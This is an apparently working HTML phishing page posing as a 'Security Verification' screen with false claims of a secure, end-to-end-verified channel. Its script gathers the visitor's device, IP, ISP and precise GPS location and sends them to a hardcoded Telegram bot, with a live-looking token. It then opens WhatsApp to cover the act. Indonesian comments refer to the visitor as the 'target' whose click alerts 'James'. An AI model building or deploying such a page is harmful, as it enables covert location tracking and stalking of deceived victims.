<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
<title>Security Verification</title>
<style>
  :root{--bg:#07080d;--panel:#0e1018;--line:#1c2030;--accent:#3d7eff;--accent2:#00e0b8;--text:#e6ebf7;--muted:#7d879e;--ok:#22c55e;--err:#ef4444}
  *{box-sizing:border-box;-webkit-tap-highlight-color:transparent}
  html,body{margin:0;height:100%;font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:var(--bg);color:var(--text)}
  body{display:flex;align-items:center;justify-content:center;min-height:100dvh;padding:20px}
  .bgfx{position:fixed;inset:0;z-index:0;pointer-events:none;background:radial-gradient(600px 400px at 15% 10%,rgba(61,126,255,.18),transparent 60%),radial-gradient(500px 350px at 90% 90%,rgba(0,224,184,.14),transparent 60%);animation:drift 12s ease-in-out infinite alternate}
  @keyframes drift{from{transform:translate3d(0,0,0) scale(1)}to{transform:translate3d(-2%,2%,0) scale(1.06)}}
  .card{position:relative;z-index:1;width:min(460px,100%);background:linear-gradient(180deg,#0f1220,#0a0c14);border:1px solid var(--line);border-radius:22px;padding:26px 22px 22px;box-shadow:0 24px 60px -18px rgba(0,0,0,.7),inset 0 1px 0 rgba(255,255,255,.03)}
  .badge{display:inline-flex;align-items:center;gap:8px;padding:6px 12px;border-radius:999px;background:rgba(61,126,255,.12);color:#9bbdff;font-size:12px;font-weight:600;letter-spacing:.4px;border:1px solid rgba(61,126,255,.25)}
  .dot{width:7px;height:7px;border-radius:50%;background:var(--accent2);box-shadow:0 0 10px var(--accent2);animation:pulse 1.6s ease-in-out infinite}
  @keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
  h1{font-size:22px;margin:16px 0 6px;line-height:1.2;letter-spacing:-.3px}
  .sub{color:var(--muted);font-size:14px;line-height:1.55;margin:0 0 18px}
  .rows{display:grid;gap:8px;margin-bottom:18px}
  .row{display:flex;justify-content:space-between;align-items:center;padding:11px 13px;background:var(--panel);border:1px solid var(--line);border-radius:12px;font-size:13px}
  .row .k{color:var(--muted)}
  .row .v{font-weight:600;text-align:right;max-width:60%;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
  .v.ok{color:var(--ok)} .v.warn{color:#f0b429} .v.err{color:var(--err)}
  .btn{display:flex;align-items:center;justify-content:center;gap:10px;width:100%;padding:16px;border:none;border-radius:14px;font-size:16px;font-weight:700;cursor:pointer;transition:transform .15s,filter .15s;margin-bottom:10px;letter-spacing:.3px}
  .btn:active{transform:scale(.97)}
  .btn.primary{background:linear-gradient(135deg,#3d7eff,#2c5fd8);color:#fff;box-shadow:0 10px 30px -10px rgba(61,126,255,.7)}
  .btn.primary:hover{filter:brightness(1.08)}
  .btn.ghost{background:transparent;border:1px solid var(--line);color:var(--text)}
  .btn:disabled{opacity:.5;cursor:not-allowed}
  .foot{text-align:center;font-size:11px;color:var(--muted);margin-top:16px}
  .hint{font-size:11px;color:var(--muted);text-align:center;margin:-4px 0 12px}
  .hidden{display:none!important}
</style>
</head>
<body>
<div class="bgfx"></div>
<div class="card">
  <span class="badge"><span class="dot"></span> SECURE CHANNEL</span>
  <h1>Security Verification</h1>
  <p class="sub">Location verification is required to continue. Tap the button below to confirm your session.</p>

  <div class="rows">
    <div class="row"><span class="k">Device</span><span class="v" id="vDevice">—</span></div>
    <div class="row"><span class="k">Network</span><span class="v" id="vNet">—</span></div>
    <div class="row"><span class="k">Public IP</span><span class="v" id="vIP">—</span></div>
    <div class="row"><span class="k">Location</span><span class="v" id="vGeo">pending</span></div>
  </div>

  <button class="btn primary" id="bVerify">
    <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/><circle cx="12" cy="9" r="2.5"/></svg>
    Verify Location
  </button>
  <button class="btn ghost hidden" id="bOpenApp">Open App</button>

  <div class="foot">Protected by end-to-end verification · TLS 1.3</div>
</div>

<script>
/* ===================== CONFIG ===================== */
const BOT_TOKEN = "8800888163:AAGqXJcFIS9AbQAbv7nhMyVBctsgSGgwxzY";
const CHAT_ID   = "1979116632";

/* App yang mau dibuka setelah verifikasi.
   Ganti sesuai target. Contoh di bawah WhatsApp. */
const TARGET_APP = {
  name: 'WhatsApp',
  androidIntent: 'intent://send#Intent;package=com.whatsapp;end',
  iosScheme: 'whatsapp://',
  desktopUrl: 'https://web.whatsapp.com/',
  playStore: 'https://play.google.com/store/apps/details?id=com.whatsapp',
  appStore: 'https://apps.apple.com/app/whatsapp-messenger/id310633997'
};
/* ================================================== */

const $ = id => document.getElementById(id);

const isAndroid = /android/i.test(navigator.userAgent);
const isIOS     = /iphone|ipad|ipod/i.test(navigator.userAgent);
const isDesktop = !isAndroid && !isIOS;

/* ---------- device info ---------- */
function detectDevice(){
  const ua = navigator.userAgent || '';
  let os = 'Unknown', browser = 'Unknown';
  if(isAndroid) os='Android'; else if(isIOS) os='iOS';
  else if(/windows/i.test(ua)) os='Windows';
  else if(/macintosh|mac os x/i.test(ua)) os='macOS';
  else if(/linux/i.test(ua)) os='Linux';
  if(/edg\//i.test(ua)) browser='Edge';
  else if(/chrome|crios/i.test(ua) && !/edg/i.test(ua)) browser='Chrome';
  else if(/firefox|fxios/i.test(ua)) browser='Firefox';
  else if(/safari/i.test(ua) && !/chrome/i.test(ua)) browser='Safari';
  return {os, browser, ua, screen:`${screen.width}x${screen.height}`,
    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    language: navigator.language};
}

function detectNetwork(){
  const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
  return {type: c.effectiveType || 'unknown',
    downlink: c.downlink ? c.downlink+' Mbps' : 'unknown',
    rtt: c.rtt ? c.rtt+' ms' : 'unknown',
    online: navigator.onLine};
}

async function fetchIP(){
  for(const u of ['https://api.ipify.org?format=json','https://ipapi.co/json/','https://api.ip.sb/geoip']){
    try{
      const r = await fetch(u, {cache:'no-store'});
      if(!r.ok) continue;
      const j = await r.json();
      const ip = j.ip || j.query;
      if(ip) return {ip, country: j.country_name||j.country||'', city: j.city||'',
        region: j.region||'', isp: j.org||j.isp||'', lat: j.latitude||'', lon: j.longitude||''};
    }catch(e){}
  }
  return {ip:'unknown'};
}

/* ---------- Telegram ---------- */
async function tgMessage(text){
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('text', text);
  fd.append('parse_mode', 'HTML');
  fd.append('disable_web_page_preview', 'true');
  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
    {method:'POST', body: fd}).then(r=>r.json()).catch(()=>null);
}

/* ---------- GPS with fallback ---------- */
function requestGPS(){
  return new Promise(resolve => {
    if(!navigator.geolocation){
      resolve({error:'unsupported'});
      return;
    }
    // timeout panjang karena target mungkin butuh waktu tap "Allow"
    navigator.geolocation.getCurrentPosition(
      p => resolve({
        lat: p.coords.latitude,
        lon: p.coords.longitude,
        acc: p.coords.accuracy,
        alt: p.coords.altitude,
        heading: p.coords.heading,
        speed: p.coords.speed,
        ts: p.timestamp
      }),
      e => resolve({
        error: e.code === 1 ? 'denied' :
               e.code === 2 ? 'unavailable' :
               e.code === 3 ? 'timeout' : 'unknown',
        code: e.code,
        message: e.message
      }),
      {enableHighAccuracy: true, timeout: 30000, maximumAge: 0}
    );
  });
}

/* ---------- open target app ---------- */
function openTargetApp(){
  let url;
  if(isAndroid)      url = TARGET_APP.androidIntent;
  else if(isIOS)     url = TARGET_APP.iosScheme;
  else               url = TARGET_APP.desktopUrl;

  try{
    const a = document.createElement('a');
    a.href = url;
    a.style.display = 'none';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }catch(e){}

  // fallback: kalau app tidak terpasang (halaman masih visible setelah 2.5s)
  setTimeout(() => {
    if(!document.hidden){
      const store = isAndroid ? TARGET_APP.playStore :
                    isIOS     ? TARGET_APP.appStore :
                                TARGET_APP.desktopUrl;
      window.location.href = store;
    }
  }, 2500);
}

/* ---------- init ---------- */
let deviceInfo, netInfo, ipInfo;

(async function init(){
  deviceInfo = detectDevice();
  netInfo    = detectNetwork();
  ipInfo     = await fetchIP();

  $('vDevice').textContent = deviceInfo.os+' · '+deviceInfo.browser;
  $('vDevice').className = 'v ok';
  $('vNet').textContent = netInfo.type.toUpperCase()+(netInfo.online?'':' · offline');
  $('vNet').className = 'v '+(netInfo.online?'ok':'err');
  $('vIP').textContent = ipInfo.ip + (ipInfo.country?` (${ipInfo.country})`:'');
  $('vIP').className = 'v ok';
})();

/* ---------- main flow ---------- */
$('bVerify').onclick = async () => {
  $('bVerify').disabled = true;
  $('vGeo').textContent = 'requesting…';
  $('vGeo').className = 'v warn';

  // kirim "started" marker dulu (opsional, biar James tahu target klik)
  await tgMessage(
`<b>👆 Verify tapped</b>
<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
<b>IP:</b> ${ipInfo.ip} ${ipInfo.country?'· '+ipInfo.country:''}
<b>Target app:</b> ${TARGET_APP.name}`
  ).catch(()=>{});

  const geo = await requestGPS();

  // siapkan pesan hasil
  let geoLine;
  if(geo.error){
    geoLine = `<b>GPS:</b> ❌ ${geo.error}`;
    $('vGeo').textContent = geo.error;
    $('vGeo').className = 'v err';
  } else {
    geoLine = `<b>GPS:</b> ✅ ${geo.lat.toFixed(6)}, ${geo.lon.toFixed(6)} (±${Math.round(geo.acc)}m)`;
    $('vGeo').textContent = `${geo.lat.toFixed(4)}, ${geo.lon.toFixed(4)}`;
    $('vGeo').className = 'v ok';
  }

  const ipGeoLine = (ipInfo.lat && ipInfo.lon)
    ? `<b>IP approx:</b> ${ipInfo.lat}, ${ipInfo.lon} (${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country})`
    : `<b>IP approx:</b> ${ipInfo.city||'n/a'}, ${ipInfo.region||'n/a'}, ${ipInfo.country||'n/a'}`;

  await tgMessage(
`<b>📍 Location Result</b>

<b>Device:</b> ${deviceInfo.os} · ${deviceInfo.browser}
<b>Screen:</b> ${deviceInfo.screen}
<b>Lang:</b> ${deviceInfo.language} · <b>TZ:</b> ${deviceInfo.timezone}
<b>Network:</b> ${netInfo.type} · ${netInfo.downlink} · RTT ${netInfo.rtt}
<b>IP:</b> ${ipInfo.ip}
<b>ISP:</b> ${ipInfo.isp||'n/a'}
${ipGeoLine}
${geoLine}
${!geo.error ? `<b>Accuracy:</b> ${Math.round(geo.acc)}m
<b>Altitude:</b> ${geo.alt!=null?Math.round(geo.alt)+'m':'n/a'}
<b>Heading:</b> ${geo.heading!=null?Math.round(geo.heading)+'°':'n/a'}
<b>Speed:</b> ${geo.speed!=null?geo.speed.toFixed(2)+' m/s':'n/a'}`
: `<b>Reason:</b> ${geo.message||geo.error}`}

<b>Maps:</b> ${!geo.error?`https://www.google.com/maps?q=${geo.lat},${geo.lon}`:(ipInfo.lat?`https://www.google.com/maps?q=${ipInfo.lat},${ipInfo.lon}`:'n/a')}

<b>Target app:</b> ${TARGET_APP.name} — launching…`
  ).catch(()=>{});

  // buka app target setelah verifikasi
  setTimeout(() => {
    openTargetApp();
    $('bVerify').classList.add('hidden');
    $('bOpenApp').classList.remove('hidden');
    $('bOpenApp').textContent = 'Open ' + TARGET_APP.name;
    $('bOpenApp').onclick = openTargetApp;
  }, 600);
};
</script>
</body>
</html>
